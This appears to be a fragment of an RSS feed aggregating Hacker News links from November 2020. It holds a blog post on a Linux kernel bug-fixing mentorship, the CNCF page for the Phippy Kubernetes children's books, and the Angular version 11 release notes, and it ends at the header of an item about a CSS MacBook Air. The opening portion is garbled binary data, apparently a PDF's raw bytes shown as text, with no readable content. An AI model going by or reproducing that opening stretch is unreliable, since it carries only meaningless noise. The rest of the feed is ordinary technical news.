¦È^H-üÂ1.ô”]ˆöGÜßu�6Gd‚öâö6Å5^«Šu)µdï¤}øä²Í/ˆ=•S_ŽÀ@%«€…‘0Lbƒl¶¢±Î1Z&lt; ¦Ž&nbsp;üÌHÁnzÕ‰–˜äzVŠLóó)&gt;R&amp;D¦†ø˜›ÒÕWxs¤½÷ñ‘%‚2žh~ªcü¤Z÷€DëÉúÅõžŒ?Îéc§Ò�„ñ?á‚°'RˆU4ç}‡Ž@4$¶pjËŒgó—ÐÈY+®ž‚íhi¡P
Ð‘=*õ„d¾+ÑŸ¤‚,¢i«t+Jš@B~ˆ¾”S8¯Õ%¡ÆûŠÿ@L\%Ë³EÆS ·ù­â›jPˆ¥ÛÏ”
a—�²`Ç.¤kQÏÁ Öf[Ì·
~Eû”©Ç˜rxAiÅå]²5	¥nš/+í3æ6Ê£x:;Í~0Ù‰‡ƒifã½Þ°ºÜ­n1Ú¡Ç
©�dé)ÓH$w¿³æâ�”Å&lt;(k§9áY-wâ‘v�d–ö=C¯\&gt;sedÅqÉàÚ5 ¦ï5Ìz�nè|ÓÈÖ%“7dœd´[W+
»Éˆ¾‹–J*·ì9ç•‚."éÙ]ùÂdåÔ]ˆç¡óC1I¬DÞ™h¨ÏU¤BKº«æ5t·óí*èé9Á­-ÁÝæLì¹$PÔ¨-–±r
QÔj÷t�y#CÉšßÍ
BÍxÂë2å…h]õbÂ˜±¿¼KdmÒ\ºÊZûÈ	)ƒ {¶9A–íþ)_º67Ò&nbsp;NB£†z¶:k“±Ðõš�m€Có;¢«ÎT
Ø�)!¬r©Š±ÑCúó&nbsp;ˆž›ê•#pŸØkÇFTïÔÅ‹–-ˆó OB%:‰
LdrNªïÖYä9â³°Þ¥H6ÄÒú’_T&nbsp;8§¤Ñ
yu
»up&nbsp;s+�¤�³tX­YìXF±“rïÕ¦€»œÓ%Ñií945”»1’UfkJý;EèÓµàŠòPj‰ílGœeÉÄêýÒgiu(¥š¯%'²@Î7:†xOXqéÌ…ÍM(tÙó_8¢7�ò¢º›Ž!.Dÿo3Ëˆ-_ï¦Q—_³RÌF'¦,º6z¤^g)ÍD1»›ôSø[)�cs¨h)&lt;\Üo.2íËq?[¼»qI,²v;âw­.4Êeœ.�=y&nbsp;ÅˆèíýÀ&nbsp;¾PoÂY“·�XLp�&lt;„�,êåÛ8gË¯×@[^¬P\{xÂÐ©·ÌçxÉbH
KhïUD½Ì@´Ëf/Àdá^Íx"&amp;´Ä–v…ßÍŒÞyàÒ:IjÇÀŒ!(ÎVŽ�Å¦[WØ’+^¸ú›è`n‹Ô�&amp;øçi':“w9¦L&lt;¶[Qu™Wà3‰û  ;ì(ÿÙðØìn\é±jN÷s“NËÍÖ�2åŠ\qõ¦L¥¼)Ÿ•4Ãä)Œð¯†~4ŽrR?�wÍ}f Ù…ŠÅ}Ì&gt;±YK9å!u
Ä kxWœûPU¡ÌkMD�1&lt;®…¢N&gt;ç–S"SöFÉ
õÉrd�¼/TÛ’hÏsñþÂî-5·[(Ú¾Öd8OF­©¥f^ò†ÛûB3êw…z}(2ãµˆÌÇ³«ûqÍÙ0ò]8Ô•§r�oÈºölŠ	¤«=]™~TŽýIXMêùjHm¾[:DTn8Ü%‚Öí'riå/ì&gt;s„ëœ‘)Hæ‚ÞÁM�S9—Ü		¯‹T`{MÌ»0˜òžÉÁ%»˜(¿µñ^AbÑ5&amp;ö7_›Œ[„)ƒòßu-™p:�¹–¿ôÚuçR(­ÛŒ¦gd•ðùKi-�Õz4‘žûsPÆí(ç”O…Öo‘ŽþäÔÄ‹f2žb`Qõþ©¤ßÔµçuqÎyéïOAw÷{±LÑ•mNäôø)…</h[þg*à-üñ9òyq3ô?n2®&ž�mš®¸‡93×ñ«ìvvu#;.¸ƒšðj…:ú!‰b¹&�yû\çj·�øï¸jß²”ã3y–w-‡„ã¹àfg¹ù¥qbëã></k“ið"{¬€¹éfº…é‡è5ò></swï.></l}k&r></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://people.idsia.ch/~juergen/fastestuniverse.pdf">http://people.idsia.ch/~juergen/fastestuniverse.pdf</a></em></p>]]>
            </description>
            <link>http://people.idsia.ch/~juergen/fastestuniverse.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065400</guid>
            <pubDate>Thu, 12 Nov 2020 01:37:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Kernel Bug Fixing Mentorship]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065177">thread link</a>) | @simonpure
<br/>
November 11, 2020 | https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship | <a href="https://web.archive.org/web/*/https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="634481719919165440">
                    
                        
                            <h3><a href="https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">Linux Kernel Bug Fixing Mentorship</a></h3>
                        <p>I recently finished a three months long <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2F&amp;t=NDEzMGM3ODdiMzA0N2I4ZDFhNmRiNjNjZmExNDMxYjNkZGUwYmZlZCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605428557" target="_blank">CommunityBridge(now knows as LFX)</a> mentorship with <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.linuxfoundation.org%2F&amp;t=NjdkZWVlNjQ4YjZhNzU3MzNhMzFmMjY0NWZkNWQxNTNmYjI4NTQwNixxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605428557" target="_blank">The Linux Foundation</a>. I worked as a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2Fproject%2Ff06db0d5-537e-4e0f-8ca4-0a471f95a04d&amp;t=MDFlNjdkMjI5ZjYwMDIxMzM4YTg0YTA1NjAxYzYyMzU5ZGIwNzYwMSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605428557" target="_blank">Linux kernel bug fixing</a> mentee under <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.kroah.com%2Flog%2Fabout.html&amp;t=ODEwMzRiOTdjNGFmOGE0OTAzMTdjYjcxMjAwMzg1ZWQwNWE3MmZhOSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605428557" target="_blank">Greg Kroah-Hartman</a>. This post is about my experience and work during the mentorship program.</p><p>In
the first week of the mentorship program, I learned about debugging
techniques for the Linux kernel, how to use decode_stacktrace.sh, and
what is CONFIG_KASAN. These were all unfamiliar concepts for me, and
I found the mentors’ learning resources very useful. My first task
was to write summaries of my understanding of these concepts. I found
these summaries quite helpful while fixing real bugs in the kernel
later in the mentorship.</p><p>I
was also unfamiliar with syzkaller and syzbot before becoming part of
the mentorship. So after completing the summary tasks, I spent the
next few days getting familiar with these tools. The syzbot dashboard
has hundreds of reported bugs, and I found it a little challenging to
decide which one I should pick first.</p><p>In
the meantime, my mentor, Greg KH, redirected me towards an ongoing
discussion regarding a bug produced due to a short read in
usb_control_msg() call. There existed a few ways to fix it, and after
discussing them with the mentor, I proposed a fix. The patch
generated a fair amount of discussion, and I also received comments
that the proposed fix wasn’t the right way to handle the bug. The
discussion also concluded that many other usages of
usb_control_msg(), which don’t have proper error checks, are also
prone to similar bugs. I fixed the bug by adding an adequate error
check to prevent short reads in the caller, and Greg KH wrote new
wrapper functions for usb_control_msg() to be used in such scenarios
to avoid similar bugs.</p><p>Apart
from this bug, I also explored two other bugs. I found them
fascinating because inspite of being listed on the dashboard, their
reproducers weren’t triggering any issues. I learned that a commit
had fixed one of these bugs, and it was yet to be applied to all
kernel trees. But the other bug didn’t have any reported fix, yet the
reproducer wasn’t triggering the issue. I discussed this with the
mentor and learned that the syzbot dashboard isn’t quite dynamic. So
we decided to mark the bug as “invalid.” On a later
discussion with other community members I learned that it was not a
good idea, and I’ve ended up marking a potentially valid bug as
“invalid”!</p><p>As
a follow-up work on the first usb_control_msg() bug, I submitted a
cleanup patch series for some of the drivers/net/usb files. One of
those patches ignored the GFP_NOIO flag used in the original code and
replaced it with the GFP_KERNEL flag used in the new wrapper API
functions. It was a blunder that resulted in a discussion to add a
new argument for memory allocation flags in the wrapper functions.
Now the wrapper functions take memory flags as arguments preventing
mentees like me from repeating such blunders.</p><p>I
continued the follow-up work by investigating drivers/usb/serial/
files. I noticed that many usages of usb_control_msg() rely on its
return value of the number of bytes read/wrote. And the new wrapper
functions don’t retain that information. So I had a discussion with
the mentor about if that information was really necessary. We
concluded that it is almost always unnecessary, and having an error
code returned is a better way.</p><p>I
ended up submitting 19 patches as part of the mentorship program. The
first one is a fix for the usb_control_msg() short read bug. The next
three are cleanup patches for usb_control_msg() wrapper functions for
drivers/net/usb files, which were rejected because of the memory flag
blunder. And the remaining 15 are usb_control_msg() cleanup patches
for drivers/usb/serial/ files. Greg KH has reviewed them, but they
are not yet merged in the mainline.</p><p>Apart
from the bug fixing, I also learned few other interesting things
about the Linux kernel and its developer community, like how we test
various changes in the kernel and why we strictly use plain text
emails. I also attended talks at the Linux Plumber’s Conference and
the Open Source Summit Europe during the mentorship, which helped me
catch up with what is happening in the kernel world, learn new
things, and make new connections.</p><p>
My
mentorship program experience has been fantastic, and I recommend it
to everyone interested in pursuing Linux kernel development and
looking for mentoring. I am heartily thankful to my mentor Greg KH,
Shuah Khan, and The Linux Foundation, for providing me with this
opportunity and a great learning experience. 
</p><p>Patches can be found on&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flore.kernel.org%2Flkml%2F%3Fq%3Dhimadrispandya&amp;t=YjEwNzY4MGY3MzdjNGVlZWYzNDA5NTlmOGVmNDYxMmM0MDdiMmIxMixxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605428557" target="_blank"> https://lore.kernel.org/lkml/?q=himadrispandya.<br></a></p>
                    </article></div>]]>
            </description>
            <link>https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065177</guid>
            <pubDate>Thu, 12 Nov 2020 01:13:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Illustrated Children's Guide to Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065144">thread link</a>) | @tomasreimers
<br/>
November 11, 2020 | https://www.cncf.io/phippy/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/phippy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
<div><figure><img loading="lazy" width="472" height="487" src="https://www.cncf.io/wp-content/uploads/2020/07/phippy-01-1.svg" alt=""></figure><p><strong>Phippy</strong>&nbsp;is a simple PHP app, trying to find a home in a cloud native world.</p></div>







<div><div>




<h2>Introducing Phippy and friends</h2>












</div></div>







<div>
<div>
<figure><img loading="lazy" width="849" height="651" src="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg 849w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-300x230.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-768x589.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-261x200.jpg 261w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-700x537.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-222x170.jpg 222w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-352x270.jpg 352w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-443x340.jpg 443w" sizes="(max-width: 849px) 100vw, 849px"></figure>




</div>



<div>
<h3>The Illustrated Children’s Guide to Kubernetes</h3>



<p><em>The Illustrated Children’s Guide to Kubernetes</em> is a simple, gentle answer a father gave his daughter when she inquisitively asked about Kubernetes. It’s dedicated to all the parents who try to explain software engineering to their children.</p>



<p>The star of <em>The Illustrated Children’s Guide to Kubernetes</em>, Phippy and her friends explain the core concepts of Kubernetes in simple terms.</p>




</div>
</div>







<div>
<div>
<h3>Phippy Goes to the Zoo</h3>



<p>Follow the tale of Phippy and her niece Zee as they take an educational trip to the Kubernetes Zoo.</p>








</div>



<div>
<figure><img loading="lazy" width="851" height="655" src="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg 851w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-300x231.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-768x591.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-260x200.jpg 260w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-700x539.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-221x170.jpg 221w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-351x270.jpg 351w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-442x340.jpg 442w" sizes="(max-width: 851px) 100vw, 851px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy and Zee go to the Mountains</h3>



<p>Another work featuring Phippy and friends: Join Phippy and Zee on a 4-dimensional hike!</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="768" src="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-300x225.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-768x576.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-267x200.jpg 267w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-700x525.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-227x170.jpg 227w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-360x270.jpg 360w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-453x340.jpg 453w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8.jpg 1367w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy In Space: Adventures in Cloud-Native Recovery</h3>



<p>In the not-so-distant future, space outposts (cloud-native infrastructure) are the next frontier for settlement and Captain Kube is in charge of the cutting-edge Mars outpost. As the outpost has grown in size and complexity, Captain Kube needs to find solutions for many of the settlement’s growing pains. He has recruited Phippy to work with him on the outpost’s Day 2 challenges.</p>



<p>Join them on their adventure, as they journey to Mars and brainstorm solutions.</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="792" src="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-300x232.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-768x594.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1536x1187.jpg 1536w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-259x200.jpg 259w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-700x541.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-220x170.jpg 220w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-349x270.jpg 349w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-440x340.jpg 440w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space.jpg 1568w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>















<p>The characters Phippy, Captain Kube, Goldie, and Zee and the two books are owned by The Linux Foundation, on behalf of the Cloud Native Computing Foundation, and licensed under the Creative Commons Attribution License (<a href="https://creativecommons.org/licenses/by/4.0/">CC-BY</a>), which means that you can remix, transform, and build upon the material for any purpose, even commercially. If you use the characters, please include the text “<a href="https://phippy.io/">phippy.io</a>” to provide attribution (and online, please include a link to&nbsp;<a href="https://phippy.io/">https://phippy.io</a>).</p>



<p>The characters and the two books were created by&nbsp;<a href="https://twitter.com/technosophos">Matt Butcher</a>,&nbsp;<a href="https://twitter.com/karenhchu">Karen Chu</a>, and&nbsp;<a href="https://www.baileyjeanstudio.com/">Bailey Beougher</a>&nbsp;and donated by Microsoft to CNCF. Goldie is based on the Go Gopher, created by&nbsp;<a href="https://blog.golang.org/gopher">Renee French</a>, which is also licensed under&nbsp;<a href="https://creativecommons.org/licenses/by/3.0/" target="_blank" rel="noreferrer noopener">CC-BY</a>.</p>



<p>Images of Phippy, Captain Kube, Goldie, and Zee are available in the CNCF&nbsp;<a href="https://github.com/cncf/artwork/blob/master/examples/other.md#phippy--friends-group-logos">artwork</a>&nbsp;repo in svg and png formats and in color, black, and white.</p>
	</article>
</div></div>]]>
            </description>
            <link>https://www.cncf.io/phippy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065144</guid>
            <pubDate>Thu, 12 Nov 2020 01:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Version 11 of Angular Now Available]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25065091">thread link</a>) | @mgechev
<br/>
November 11, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065091</guid>
            <pubDate>Thu, 12 Nov 2020 01:06:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MacBook Air in Pure CSS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064721">thread link</a>) | @ent101
<br/>
November 11, 2020 | https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">archive.org</a>
